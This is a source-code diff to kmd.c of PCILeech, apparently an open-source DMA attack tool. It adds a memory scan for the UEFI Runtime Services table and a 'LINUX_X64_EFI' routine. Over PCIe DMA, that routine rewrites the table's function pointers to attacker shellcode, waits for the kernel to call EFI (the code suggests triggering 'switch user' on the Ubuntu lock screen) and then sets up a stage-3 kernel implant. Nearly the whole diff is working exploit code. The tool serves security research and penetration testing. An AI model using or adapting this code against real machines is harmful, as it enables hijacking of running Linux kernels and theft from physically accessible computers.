@@ -1,6 +1,6 @@
 // kmd.c : implementation related to operating systems kernel modules functionality.
 //
-// (c) Ulf Frisk, 2016
+// (c) Ulf Frisk, 2016, 2017
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 #include "kmd.h"
@@ -113,6 +113,49 @@ HRESULT KMD_FindSignature1(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In
 	LocalFree(pbBuffer8M);
 	PageStatClose(&pageStat);
 	return E_FAIL;
+}
+
+// EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
+#define IS_SIGNATURE_EFI_RUNTIME_SERVICES(pb) ((*(PQWORD)(pb) == 0x56524553544e5552) && (*(PDWORD)(pb + 12) == 0x88) && (*(PDWORD)(pb + 20) == 0))
+
+BOOL KMD_FindSignature_EfiRuntimeServices(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PQWORD pqwAddrPhys)
+{
+	BOOL result = FALSE;
+	QWORD o, qwCurrentAddress;
+	PAGE_STATISTICS pageStat;
+	PBYTE pbBuffer16M;
+	if(!(pbBuffer16M = LocalAlloc(0, 0x01000000))) {
+		return FALSE;
+	}
+	pCfg->qwAddrMin &= ~0xfff;
+	pCfg->qwAddrMax = (pCfg->qwAddrMax + 1) & ~0xfff;
+	if(pCfg->qwAddrMax == 0) {
+		pCfg->qwAddrMax = 0x100000000;
+	}
+	qwCurrentAddress = pCfg->qwAddrMin;
+	PageStatInitialize(&pageStat, pCfg->qwAddrMin, pCfg->qwAddrMax, "Searching for EFI Runtime Services", pDeviceData->KMDHandle ? TRUE : FALSE, pCfg->fVerbose);
+	while(qwCurrentAddress < pCfg->qwAddrMax) {
+		result = Util_Read16M(pCfg, pDeviceData, pbBuffer16M, qwCurrentAddress, &pageStat);
+		if(!result && !pCfg->fForceRW && !pDeviceData->KMDHandle) {
+			goto cleanup;
+		}
+		for(o = 0x18; o < 0x01000000 - 0x88; o += 8) {
+			// EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
+			// 0x30646870 == phd0 EFI memory artifact required to rule out additional false positives.
+			if((*(PDWORD)(pbBuffer16M + o - 0x18) == 0x30646870) && IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbBuffer16M + o)) {
+				pageStat.szAction = "Waiting for EFI Runtime Services";
+				*pqwAddrPhys = qwCurrentAddress + o;
+				result = TRUE;
+				goto cleanup;
+			}
+		}
+		// add to address
+		qwCurrentAddress += 0x01000000;
+	}
+cleanup:
+	LocalFree(pbBuffer16M);
+	PageStatClose(&pageStat);
+	return result;
 }
 
 //-------------------------------------------------------------------------------
@@ -232,7 +275,7 @@ error:
 }
 
 //-------------------------------------------------------------------------------
-// LINUX generic kernel seek below.
+// LINUX generic kernel seek below. (pre 4.8 kernel versions).
 //-------------------------------------------------------------------------------
 
 BOOL KMD_LinuxIsAllAddrFoundSeek(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
@@ -325,12 +368,96 @@ BOOL KMD_LinuxKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceDa
 			KMD_LinuxFindFunctionAddr(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2) &&
 			KMD_LinuxFindFunctionAddrTBL(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2);
 		if(result) {
-			Util_CreateSignatureLinuxGeneric(dwKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].vaFn, pSignature);
+			Util_CreateSignatureLinuxGenericPre48(dwKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].vaFn, pSignature);
 			break;
 		}
 	}
 	LocalFree(pb);
 	return result;
+}
+
+//-------------------------------------------------------------------------------
+// LINUX EFI Runtime Services hijack.
+//-------------------------------------------------------------------------------
+
+BOOL KMDOpen_LinuxEfiRuntimeServicesHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
+{
+	BOOL result;
+	QWORD i, o, qwAddrEfiRt;
+	DWORD dwPhysAddrS2, dwPhysAddrS3, *pdwPhysicalAddress;
+	BYTE pb[0x1000], pbOrig[0x1000], pbEfiRt[0x1000];
+	SIGNATURE oSignature;
+	//------------------------------------------------
+	// 1: Locate and fetch EFI Runtime Services table.
+	//------------------------------------------------
+	result = KMD_FindSignature_EfiRuntimeServices(pCfg, pDeviceData, &qwAddrEfiRt);
+	if(!result) {
+		printf("KMD: Failed. EFI Runtime Services not found.\n");
+	}
+	if((qwAddrEfiRt & 0xfff) + 0x88 > 0x1000) {
+		printf("KMD: Failed. EFI Runtime Services table located on page boundary.\n");
+		return FALSE;
+	}
+	result = DeviceReadDMA(pDeviceData, qwAddrEfiRt & ~0xfff, pbEfiRt, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	if(!result || !IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbEfiRt + (qwAddrEfiRt & 0xfff))) {
+		printf("KMD: Failed. Error reading EFI Runtime Services table.\n");
+		return FALSE;
+	}
+	//------------------------------------------------
+	// 2: Fetch signature and original data.
+	//------------------------------------------------
+	Util_CreateSignatureLinuxEfiRuntimeServices(&oSignature);
+	*(PQWORD)(oSignature.chunk[3].pb + 0x28) = qwAddrEfiRt; // 0x28 == offset data_addr_runtserv.
+	memcpy(oSignature.chunk[3].pb + 0x30, pbEfiRt + (qwAddrEfiRt & 0xfff) + 0x18, 0x70);	// 0x30 == offset data_runtserv_table_fn.
+	result = DeviceReadDMA(pDeviceData, 0, pbOrig, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	if(!result) {
+		printf("KMD: Failed. Error reading at address 0x0.\n");
+		return FALSE;
+	}
+	//------------------------------------------------
+	// 3: Patch wait to reveive execution of EFI code.
+	//------------------------------------------------
+	DeviceWriteDMA(pDeviceData, 0, oSignature.chunk[3].pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	for(i = 0; i < 14; i++) {
+		o = (qwAddrEfiRt & 0xfff) + 0x18 + 8 * i;	// 14 tbl entries of 64-bit/8-byte size.
+		*(PQWORD)(pbEfiRt + o) = 0x100 + 2 * i;	// each PUSH in receiving slide is 2 bytes, offset to code = 0x100.
+	}
+	DeviceWriteDMA(pDeviceData, qwAddrEfiRt, pbEfiRt + (qwAddrEfiRt & 0xfff), 0x88 /* 0x18 hdr, 0x70 fntbl */, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	memset(pb, 0, 0x1000);
+	pdwPhysicalAddress = (PDWORD)(pb + 0x20);	// 0x20 == offset data_phys_addr_alloc.
+	printf(
+		"KMD: EFI Runtime Services table hijacked - Waiting to receive execution.\n"
+		"     To trigger EFI execution take action. Example: 'switch user' in the\n"
+		"     Ubuntu graphical lock screen may trigger EFI Runtime Services call.\n");
+	do {
+		Sleep(100);
+		if(!DeviceReadDMA(pDeviceData, 0, pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
+			Util_WaitForPowerCycle(pCfg, pDeviceData);
+			printf("KMD: Resume waiting to receive execution.\n");
+		}
+	} while(!*pdwPhysicalAddress);
+	dwPhysAddrS2 = *pdwPhysicalAddress;
+	printf("KMD: Execution received - waiting for kernel hook to activate ...\n");
+	//------------------------------------------------
+	// 4: Restore EFI Runtime Services shellcode and move on to 2nd buffer.
+	//------------------------------------------------
+	DeviceWriteDMA(pDeviceData, 0, pbOrig, 0x1000, 0);
+	memset(pb, 0, 0x1000);
+	printf("KMD: Waiting to receive execution.\n");
+	do {
+		Sleep(100);
+		if(!DeviceReadDMA(pDeviceData, dwPhysAddrS2, pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
+			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
+			return FALSE;
+		}
+	} while(!*pdwPhysicalAddress);
+	dwPhysAddrS3 = *pdwPhysicalAddress;
+	//------------------------------------------------
+	// 5: Clear 2nd buffer and set up stage #3.
+	//------------------------------------------------
+	memset(pb, 0, 0x1000);
+	DeviceWriteDMA(pDeviceData, dwPhysAddrS2, pb, 0x1000, 0);
+	return KMD_SetupStage3(pCfg, pDeviceData, dwPhysAddrS3, oSignature.chunk[4].pb, 4096);
 }
 
 //-------------------------------------------------------------------------------
@@ -890,6 +1017,8 @@ BOOL KMDOpen(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 		return KMDOpen_PageTableHijack(pCfg, pDeviceData);
 	} else if(0 == _stricmp(pCfg->szKMDName, "WIN10_X64")) {
 		return KMDOpen_HalHeapHijack(pCfg, pDeviceData);
+	} else if(0 == _stricmp(pCfg->szKMDName, "LINUX_X64_EFI")) {
+		return KMDOpen_LinuxEfiRuntimeServicesHijack(pCfg, pDeviceData);
 	} else {
 		return KMDOpen_MemoryScan(pCfg, pDeviceData);
 	}
